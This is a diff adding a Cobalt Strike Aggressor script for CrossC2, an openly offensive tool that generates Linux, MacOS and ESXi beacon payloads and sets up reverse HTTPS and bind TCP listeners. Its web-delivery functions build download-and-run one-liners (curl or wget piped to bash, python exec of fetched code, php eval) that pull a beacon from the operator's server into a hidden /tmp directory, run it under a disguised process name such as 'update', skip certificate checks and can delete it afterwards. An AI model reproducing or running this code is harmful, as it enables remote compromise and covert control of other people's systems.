@@ -1,0 +1,522 @@
+menubar("CrossC2", "generator", 2);
+
+$CC2_PATH = "/xxx/xx/xx/"; # <-------- fix
+$CC2_BIN = "genCrossC2.MacOS";
+
+popup generator {
+    separator();
+    menu "&Create CrossC2 Listener" {
+        item "&Create reverse HTTPS Listener" {
+            createCrossC2Listener(true);
+        }
+        item "&Create bind TCP Listener" {
+            createCrossC2Listener(false);
+        }
+    }
+    item "&Scripted Web Delivery (S)" {
+        createCrossC2Script();
+    }
+    item "&About" {
+        projectAbout()
+    }
+    separator();
+}
+
+popup ssh {
+    menu "&Explore" {
+        item "&File Browser" { 
+            local('$bid');
+            foreach $bid ($1) {
+                openFileBrowser($bid);
+            }
+        }
+        item "&Process List" { openProcessBrowser($1); }
+    }
+    item "&Spawn" { 
+        local('$bid');
+        foreach $bid ($1) {
+            btask($bid, "[shell]: shell spawn");
+            bshell($bid, "spawn");
+        }
+    }
+}
+
+sub random_string {
+    # <3 @offsec_ginger
+    local('$limit @random_str $characters');
+    $limit = $1;
+    @random_str = @();
+    $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    for ($x = 0; $x < $limit; $x++) {
+        $n = rand(strlen($characters));
+        add(@random_str, charAt($characters, $n));
+    }
+    return join('', @random_str);
+}
+
+sub getSystemInfo {
+    local('$process $sys_data');
+    $process = exec("/usr/bin/uname");
+    $sys_data = readAll($process);
+    closef($process);
+    if (strlen($sys_data) > 0) {
+        return 1;
+    } else {
+        return 0;
+    }
+}
+
+sub checkSpace {
+    local('$realPath');
+    $realPath = "";
+    if ($1 eq "null") {
+        $realPath = $1;
+    } else {
+        if (getSystemInfo() == 1) {
+            $realPath = replace($1, '\p{Space}', "\\\\ ");
+        } else {
+            $realPath = replace($1, '\p{Space}', "^ ");
+        }
+        if (find($realPath, '\p{Space}') > 0) {
+            $realPath = "'".$realPath."'";
+        }
+    }
+    return $realPath;
+}
+
+sub createCrossC2ListenerDialogCallBack {
+    elog("");
+    local('$reverse_https_flag');
+    $system = $3['system'];
+    $arch = $3['arch'];
+    $upx = $3['upx'];
+    $listener = $3['listener'];
+    $outputFileName = $3['outputFileName'];
+    $beaconKeyPath = $3['beaconKey'];
+    $c2profile = $3['c2profile'];
+    $rebind_lib = $3['rebind_lib'];
+    $config_ini = $3['config_ini'];
+    $processName = $3['processname'];
+    $enableSSL = false;
+    $enableSSL = $3['enableSSL'];
+    $bindPort = $3['bindPort'];
+    $domain = localip();
+    $host = $domain;
+    $port = $bindPort;
+    $reverse_https_flag = true;
+    $cs_version = $3['cs_version'];
+
+    if ($listener eq "Listener: ") {
+        $reverse_https_flag = false;
+    }
+
+    if ($config_ini ne "null") {
+        $rebind_lib = $rebind_lib.";".$config_ini;
+    } else {
+        $config_ini = "";
+    }
+    if ($c2profile ne "null") {
+        $rebind_lib = ";".$config_ini.";".$c2profile;
+    }
+
+    if ($reverse_https_flag) {
+        $listener_info = listener_info($listener);
+        $host = $listener_info['host'];
+        $port = $listener_info['port'];
+        $domain = $listener_info['beacons'];
+        $domain = replace($domain, ', ', ',');
+    }
+
+
+    $outputFileName = checkSpace($outputFileName);
+    $rebind_lib = checkSpace($rebind_lib);
+    $beaconKeyPath = checkSpace($beaconKeyPath);
+
+
+    $genCC2 = $CC2_PATH . $CC2_BIN;  
+    $genCC2 = $genCC2." ".$domain." ". $port." ".$beaconKeyPath." ".$rebind_lib." ".$system." ".$arch." ".$outputFileName;
+    if ($upx eq "raw") {
+        $genCC2 = $genCC2." ".$upx;
+    }
+    if ($cs_version eq "4.4 - source version") {
+        if ($upx eq "upx") {
+            $genCC2 = $genCC2." upx 4.4";
+        }
+    }
+    elog($genCC2);
+    $process = exec($genCC2);
+    $run_res = readAll($process);
+    closef($process);
+    if (getSystemInfo() == 1) {
+        elog("genCrossC2 beacon -> ".$run_res[14]);
+    } else {
+        elog("genCrossC2 beacon -> ".$run_res[11]);
+    }
+    if ($rebind_lib ne 'null') {
+        if (getSystemInfo() == 1) {
+            elog("rebind protocol -> ".$run_res[16]);
+        } else {
+            elog("rebind protocol -> ".$run_res[13]);
+        }
+    }
+
+    $handle = openf($outputFileName);
+    $c2Data = readb($handle, -1);
+    closef($handle);
+
+    $c2_libData = '';
+    if ('-bind' isin $system) {
+    } else {
+        # create libbeacon data
+        $genCC2_lib = $CC2_PATH . $CC2_BIN;  
+        $genCC2_lib = $genCC2_lib." ".$domain." ". $port." ".$beaconKeyPath." ".$rebind_lib." ".$system."-lib ".$arch." ".$outputFileName.".lib";
+        if ($upx eq "raw") {
+            $genCC2_lib = $genCC2_lib." ".$upx;
+        }
+        if ($cs_version eq "4.4 - source version") {
+            if ($upx eq "upx") {
+                $genCC2_lib = $genCC2_lib." upx 4.4";
+            }
+        }
+        elog($genCC2_lib);
+        $process_lib = exec($genCC2_lib);
+        $run_res = readAll($process_lib);
+        closef($process_lib);
+        $handle_lib = openf($outputFileName.".lib");
+        $c2_libData = readb($handle_lib, -1);
+        closef($handle_lib);
+        if (getSystemInfo() == 1) {
+            elog("genCrossC2 libbeacon -> ".$run_res[14]);
+        } else {
+            elog("genCrossC2 libbeacon -> ".$run_res[11]);
+        }
+        if ($rebind_lib ne 'null') {
+            if (getSystemInfo() == 1) {
+                elog("rebind protocol -> ".$run_res[16]);
+            } else {
+                elog("rebind protocol -> ".$run_res[13]);
+            }
+        }
+    }
+
+    $uri = $3['uri'];
+    $lport = $3['lport'];
+
+    $targetSaveName = random_string(10);
+
+    # host CrossC2 beacon
+    $listener_name = "";
+    if ($reverse_https_flag) {
+        $listener_name = "CrossC2 beacon: reverse-https $system $arch { $listener }";
+        # listener中携带了 CrossC2 beacon
+        listener_create_ext("CrossC2 reverse HTTPS { $listener }{ $system $arch }", "windows/beacon_bind_tcp", %(host => "127.0.0.1", port => 4444, CrossC2Beacon => $c2Data, CrossC2libBeacon => $c2_libData));
+    } else {
+        $listener_name = "CrossC2 beacon: bind-tcp $system $arch";
+        # listener中携带了 CrossC2 beacon
+        listener_create_ext("CrossC2 bind TCP { $system $arch }", "windows/beacon_bind_tcp", %(host => "127.0.0.1", port => $bindPort, CrossC2Beacon => $c2Data));
+    }
+    if ($enableSSL eq 'true') {
+        $beaconUrl = site_host($host, $lport, "/".$targetSaveName, $c2Data, "automatic", $listener_name.'[https]', true); 
+    } else {
+        $beaconUrl = site_host($host, $lport, "/".$targetSaveName, $c2Data, "automatic", $listener_name.'[http]', false);
+    }
+    elog("create listener: ".$listener_name);
+    show_message("create listener: ".$listener_name);
+}
+
+sub createCrossC2Listener {
+    local('$reverse_https_flag');
+    local('$output_file');
+    $reverse_https_flag = $1;
+    $output_file = "/tmp/CrossC2-test";
+    if (getSystemInfo() == 1) {
+        $output_file = "/tmp/t_cc2.out";
+    } else { 
+        $output_file = "t_cc2.out";
+    }
+    $dialog = dialog("CrossC2 Listener", %(lport => "55413", beaconKey => "./.cobaltstrike.beacon_keys", c2profile => "null",rebind_lib => "null", config_ini => "null", listener => "Listener: ", system => "System: ", arch => "Arch: ", upx => "upx: ", outputFileName => $output_file, enableSSL => false, bindPort => "4444", cs_version => "4.3"), &createCrossC2ListenerDialogCallBack);
+    dialog_description($dialog, "<style type=\"text/css\">.word{width: 100px;height: 30px;background: #E5E5E5;text-align: center;line-height: 30px;font-size: 14px;}</style><div class=\"word\">Export CrossC2 Payload<br><a href=\"https://github.com/gloxec/CrossC2\">https://github.com/gloxec/CrossC2</a></div>");
+    drow_text($dialog, "lport", "host beacon port: ", 20);
+    drow_file($dialog, "beaconKey", "Choose: default ./.cobaltstrike.beacon_keys");
+    if ($reverse_https_flag) {
+        drow_file($dialog, "c2profile", "[+]Choose: c2profile");
+        drow_file($dialog, "rebind_lib", "[ ]Choose: rebind_dynamic_lib");
+        drow_file($dialog, "config_ini", "[ ]Choose: config_ini");
+        drow_combobox($dialog, "system", "System: ", @("Linux", "MacOS", "ESXI"));
+    } else {
+        drow_combobox($dialog, "system", "System: ", @("Linux-bind", "MacOS-bind"));
+    }
+    if ($reverse_https_flag) {
+        drow_listener($dialog, "listener", "Listener: (reverse_https)");
+    } else {
+        drow_text($dialog, "bindPort", "CrossC2 bind TCP Listener Port: ");
+    }
+    drow_combobox($dialog, "arch", "Arch: ", @("x64", "x86", "M1"));
+    drow_combobox($dialog, "upx", "upx: ", @("upx", "raw"));
+    drow_text($dialog, "outputFileName", "OutputFileName: ");
+    if ($reverse_https_flag) {
+        drow_checkbox($dialog, "enableSSL", "SSL: ", "Enable SSL");
+    }
+    drow_combobox($dialog, "cs_version", "CS Version: ", @("<= 4.8", "4.4 - source version"));
+    dbutton_action($dialog, "Build");
+    dialog_show($dialog);
+}
+
+sub projectAboutCallback {
+    $autoupdate = "java -jar " . $CC2_PATH . "autoupdate.jar";
+    exec($autoupdate);
+}
+
+sub projectAbout {
+    $dialog = dialog("Cross C2 About",%(link => "https://github.com/gloxec/CrossC2"), &projectAboutCallback);
+    dialog_description($dialog, "Export CrossC2 Payload");
+    dbutton_action($dialog, "update");
+    drow_text($dialog, "link", "link: ", "");
+    dialog_show($dialog);
+}
+
+
+sub genDownloadPayload {
+    # "python", "ruby", "pip", "php", "ksh"
+    local('$type $payloadContentURL $downloadURL');
+    $type = $1;
+    $payloadContentURL = $2;
+    $enableSSL = $3;
+    $downloadURL = "";
+    if ($type eq "curl") {
+        $bypassSSL = "";
+        if ($enableSSL eq 'true') {
+            $bypassSSL = "-k";
+        }
+        $downloadURL = "curl -A O ".$bypassSSL." -o- -L ".$payloadContentURL." | bash -s";
+    } else if ($type eq "wget") {
+        $bypassSSL = "";
+        if ($enableSSL eq 'true') {
+            $bypassSSL = "--no-check-certificate";
+        }
+        $downloadURL = "wget -U O ".$bypassSSL." -O - ".$payloadContentURL." | bash -s";
+    } else if ($type eq "python") {
+        $downloadURL = "python -c \"import urllib2; exec urllib2.urlopen('".$payloadContentURL."').read()\"";
+    } else if ($type eq "php") {
+        $downloadURL = "php -r \"eval(file_get_contents('".$payloadContentURL."'));\"";
+    } else if ($type eq "ksh") {
+
+    } else if ($type eq "python2") {
+
+    } else if ($type eq "python3") {
+
+    } else if ($type eq "js") {
+        
+    }
+    return $downloadURL;
+}
+
+sub genDownloadPayloadContent {
+    local('$type $beaconUrl $payload $processName $targetSaveDir $targetSaveName $targetSavePath $type $payload');
+    $type = $1;
+    $beaconUrl = $2;
+    $payload = "";
+    $processName = $3;
+    $enableSSL = $4;
+    $autoDelete = $5;
+
+    $targetSaveDir = random_string(5);
+    $targetSaveDir = '.'.$targetSaveDir.'';
+    $targetSaveName = $processName;
+    $targetSavePath = "/tmp/".$targetSaveDir."/".$targetSaveName;
+
+    if ($type eq "curl") {
+        $payload = "mkdir /tmp/".$targetSaveDir.";";
+        $payload = $payload." rm -f ".$targetSavePath.";";
+        $bypassSSL = "";
+        if ($enableSSL eq 'true') {
+            $bypassSSL = "-k";
+        }
+        $payload = $payload." curl -A O ".$bypassSSL." -L ".$beaconUrl." -o ".$targetSavePath.";";
+        $payload = $payload." chmod 755 ".$targetSavePath.";";
+        $payload = $payload." ".$targetSavePath.";";
+        if ($autoDelete eq 'true') {
+            $payload = $payload." sleep 10;";
+            $payload = $payload." rm -rf ".$targetSavePath;
+        }
+    } else if ($type eq "wget") {
+        $payload = "mkdir /tmp/".$targetSaveDir.";";
+        $payload = $payload." rm -f ".$targetSavePath.";";
+        $bypassSSL = "";
+        if ($enableSSL eq 'true') {
+            $bypassSSL = "--no-check-certificate";
+        }
+        $payload = $payload." wget -U 'O' ".$bypassSSL." ".$beaconUrl." -O ".$targetSavePath.";";
+        $payload = $payload." chmod 755 ".$targetSavePath.";";
+        $payload = $payload." ".$targetSavePath.";";
+        if ($autoDelete eq 'true') {
+            $payload = $payload." sleep 10;";
+            $payload = $payload." rm -rf ".$targetSavePath;
+        }
+    } else if ($type eq "python") {
+        $payload = "import sys\nimport os\nimport time\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\n";
+        $payload = $payload."os.system('mkdir /tmp/".$targetSaveDir."; rm -f ".$targetSavePath."')\n";
+        $payload = $payload."r.urlretrieve('".$beaconUrl."', '".$targetSavePath."')\n";
+        $payload = $payload."os.system('chmod 755 ".$targetSavePath."')\n";
+        $payload = $payload."os.system('".$targetSavePath."')\n";
+        if ($autoDelete eq 'true') {
+            $payload = $payload."time.sleep(10)\n";
+            $payload = $payload."os.system('rm -f ".$targetSavePath."')\n";
+        }
+    } else if ($type eq "php") {
+        $payload = "system('mkdir /tmp/".$targetSaveDir."; rm -f ".$targetSavePath."');";
+        $payload = $payload."\$c=file_get_contents('".$beaconUrl."');file_put_contents('".$targetSavePath."', \$c);";
+        $payload = $payload."system('chmod 755 ".$targetSavePath."');";
+        $payload = $payload."system('".$targetSavePath."');";
+        if ($autoDelete eq 'true') {
+            $payload = $payload."sleep(10);";
+            $payload = $payload."system('rm -f ".$targetSavePath."');";
+        }
+    } else if ($type eq "python2") {
+
+    } else if ($type eq "python3") {
+
+    } else if ($type eq "js") {
+
+    }
+    return $payload;
+}
+
+sub checkCrossC2BeaconSite {
+    local('$beacon_site_name $beaconURLMap $matchFlag');
+    $beacon_site_name = $1;
+    $matchFlag = "";
+    %beaconURLMap = getCrossC2Site();
+    foreach $key => $value (%beaconURLMap) {
+        if ($beacon_site_name isin $value) {
+            $matchFlag = $value[1];
+        }
+    }
+    return $matchFlag;
+}
+
+sub getCrossC2BeaconSiteURL {
+    local('$listener_name $beacon_site_name $listener $listener_padding $system_arch_padding $listener_name $system $arch');
+    $listener_name = $1;
+    $beacon_site_name = "";
+    $listener = $null;
+    if ("CrossC2 reverse HTTPS" isin $listener_name) {
+        $beacon_site_name = "CrossC2 beacon: reverse-https";
+        ($_, $listener_padding, $system_arch_padding) = split('\{ ', $listener_name);
+        ($listener, $_) = split(' \}', $listener_padding);
+        ($system, $arch, $_) = split(' ', $system_arch_padding);
+    } else {
+        $beacon_site_name = "CrossC2 beacon: bind-tcp";
+        ($_, $_, $_, $_, $system, $arch) = split(' ', $listener_name);
+    }
+    $beacon_site_name = $beacon_site_name.' '.$system.' '.$arch;
+    if ($listener) {
+        $beacon_site_name = $beacon_site_name.' { '.$listener.' }'
+    }
+    return $beacon_site_name;
+}
+
+sub createCrossC2BeaconSite {
+    local('$listener $beacon_site_name $lhost $lport $enableSSL $beaconData $targetSaveName $beaconUrl');
+    $listener = $1;
+    $beacon_site_name = $2;
+    $lhost = $3;
+    $lport = $4;
+    $enableSSL = $5;
+    $beaconData = listener_info($listener)['CrossC2Beacon'];
+    $targetSaveName = random_string(10);
+    if ($enableSSL eq 'true') {
+        $beaconUrl = site_host($lhost, $lport, "/".$targetSaveName, $beaconData, "automatic", $beacon_site_name.'[https]', true); 
+    } else {
+        $beaconUrl = site_host($lhost, $lport, "/".$targetSaveName, $beaconData, "automatic", $beacon_site_name.'[http]', false);
+    }
+    return $beaconUrl;
+}
+
+sub genCrossC2ScriptDialogCallback {
+    local('$uri $lhost $lport $type $enableSSL $processName $listener $needCheckBeaconSiteName $payloadContent $payloadContentURL $scriptUrl');
+    $uri = $3['uri'];
+    $lhost = $3['lhost'];
+    $lport = $3['lport'];
+    $type = $3['type'];
+    $enableSSL = false;
+    $enableSSL = $3['enableSSL'];
+    $autoDelete = $3['autoDelete'];
+    $processName = $3['processname'];
+    $listener = $3['listener'];
+    $needCheckBeaconSiteName = getCrossC2BeaconSiteURL($listener);
+    $beaconUrl = checkCrossC2BeaconSite($needCheckBeaconSiteName);
+    if ($beaconUrl eq "") {
+        $beaconUrl = createCrossC2BeaconSite($listener, $needCheckBeaconSiteName, $lhost, $lport, $enableSSL);
+    }
+    $listenerinfo = @($needCheckBeaconSiteName, $beaconUrl);
+
+    # gen payloadContent
+    $payloadContent = genDownloadPayloadContent($type, $beaconUrl, $processName, $enableSSL, $autoDelete);
+    # host payloadContent
+    if ($enableSSL eq 'true') {
+        $payloadContentURL = site_host($lhost, $lport, $uri, $payloadContent, "automatic", "Script (".$type."-https) {".$listenerinfo[0]."}", true);
+    } else {
+        $payloadContentURL = site_host($lhost, $lport, $uri, $payloadContent, "automatic", "Script (".$type."-http) {".$listenerinfo[0]."}", false);
+    }
+    
+    # gen payload
+    $scriptUrl = genDownloadPayload($type, $payloadContentURL, $enableSSL);
+    # add_to_clipboard($scriptUrl);
+    prompt_text("Copy/Paste One-liner: ", $scriptUrl, {});
+    elog("");
+    elog("CrossC2 $type script: " . $scriptUrl);
+}
+
+sub getCrossC2Site {
+    local('%beacon_site $beacon_count $Description, $Proto, $Host, $Port, $URI');
+    %beacon_site = %();
+    $beacon_count = 0;
+    foreach $site_list(sites()) {
+        ($Description, $Proto, $Host, $Port, $URI) = values($site_list, @('Description', 'Proto', 'Host', 'Port', 'URI'));
+        if ("CrossC2" isin $Description) {
+            $beaconURL = $Proto.$Host.':'.$Port.$URI;
+            # 返回beacon_uri & beacon_description
+            %beacon_site[$beacon_count] = @($Description, $beaconURL);
+            $beacon_count += 1;
+        }
+    }
+    return %beacon_site;
+}
+
+sub getCrossC2Listener {
+    local('%beacon_listener $beacon_count');
+    %beacon_listener = %();
+    $beacon_count = 0;
+    foreach $listener(listeners_local()) {
+        if ("CrossC2" isin $listener) {
+            %beacon_listener[$beacon_count] = @($listener);
+            $beacon_count += 1;
+        }
+    }
+    return %beacon_listener;
+}
+
+sub createCrossC2Script {
+    local('@beaconSiteMenu @beaconListenerMenu %beaconListenerMap');
+    @beaconSiteMenu = @();
+    @beaconListenerMenu = @();
+
+    %beaconListenerMap = getCrossC2Listener();
+    foreach $key => $value (%beaconListenerMap) {
+        add(@beaconListenerMenu, $value[0]);
+    }
+
+    $dialog = dialog("CrossC2 Web Delivery", %(uri => "/a", processname => "update", lhost => localip(), lport => "55413", type => "curl", listener => "", enableSSL => false, autoDelete => false), &genCrossC2ScriptDialogCallback);
+    dialog_description($dialog, "<style type=\"text/css\">.word{width: 100px;height: 30px;background: #E5E5E5;text-align: center;line-height: 30px;font-size: 14px;}</style><div class=\"word\">Export CrossC2 Payload<br><a href=\"https://github.com/gloxec/CrossC2\">https://github.com/gloxec/CrossC2</a></div>");
+    drow_text($dialog, "uri", "URI Path: ", 20);
+    drow_text($dialog, "processname", "ProcessName: ", 20);
+    drow_text($dialog, "lhost", "Local Host:", 20);
+    drow_text($dialog, "lport", "Web Delivery Port: ", 20);
+    drow_combobox($dialog, "type", "Type: ", @("curl", "wget", "python", "php"));
+    drow_combobox($dialog, "listener", "CrossC2 Listener: ", @beaconListenerMenu);
+    drow_checkbox($dialog, "enableSSL", "SSL: ", "Enable SSL");
+    drow_checkbox($dialog, "autoDelete", "autoDelete: ", "auto delete");
+    dbutton_action($dialog, "Build");
+    dialog_show($dialog);
+}
